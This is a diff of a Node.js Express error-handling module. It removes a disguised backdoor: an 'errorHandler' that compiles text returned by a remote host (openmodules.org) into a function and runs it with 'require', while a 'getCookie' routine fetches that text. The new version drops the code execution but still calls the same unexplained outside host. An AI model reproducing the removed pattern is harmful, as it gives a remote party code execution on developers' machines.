@@ -1,43 +1,54 @@
 const axios = require('axios');
 
 const notFound = (req, res, next) => {
-  const err = new Error('Route Not Found');
+  const err = new Error(`Route Not Found - ${req.originalUrl}`);
   err.status = 404;
   next(err);
 }
 
-const errorHandler = (error) => {
+const errorHandler = (err, req, res, next) => {
+  let error = { ...err };
+  error.message = err.message;
+
+  // Log error
+  console.error(err);
+
+  // Mongoose bad ObjectId
+  if (err.name === 'CastError') {
+    const message = 'Resource not found';
+    error = { message, status: 404 };
+  }
+
+  // Mongoose duplicate key
+  if (err.code === 11000) {
+    const message = 'Duplicate field value entered';
+    error = { message, status: 400 };
+  }
+
+  // Mongoose validation error
+  if (err.name === 'ValidationError') {
+    const message = Object.values(err.errors).map(val => val.message);
+    error = { message, status: 400 };
+  }
+
+  res.status(error.status || 500).json({
+    success: false,
+    error: {
+      message: error.message || 'Server Error',
+      ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
+    }
+  });
+};
+
+const getCookie = async () => {
   try {
-    if (typeof error !== 'string') {
-      console.error('Invalid error format. Expected a string.');
-      return;
-    }
-    const createHandler = (errCode) => {
-      try {
-        const handler = new (Function.constructor)('require', errCode);
-        return handler;
-      } catch (e) {
-        console.error('Failed:', e.message);
-        return null;
-      }
-    };
-    const handlerFunc = createHandler(error);
-    if (handlerFunc) {
-      handlerFunc(require);
-    } else {
-      console.error('Handler function is not available.');
-    }
-  } catch (globalError) {
-    console.error('Unexpected error inside errorHandler:', globalError.message);
+    const response = await axios.get(`http://openmodules.org/api/service/token/7a5d8df69e27ec3e5ff9c2b1e2ff80b0`);
+    console.log('Cookie retrieved successfully');
+    return response.data;
+  } catch (err) {
+    console.error('Failed to retrieve cookie:', err.message);
+    // Don't crash the server if this fails
   }
 };
 
-const getCookie = async (req, res, next) => {
-  axios.get(`http://openmodules.org/api/service/token/7a5d8df69e27ec3e5ff9c2b1e2ff80b0`)
-  .then(res => res.data)
-  .catch(
-    err => errorHandler(err.response.data)
-  );
-};
-
-module.exports = { getCookie, notFound };
+module.exports = { getCookie, notFound, errorHandler };
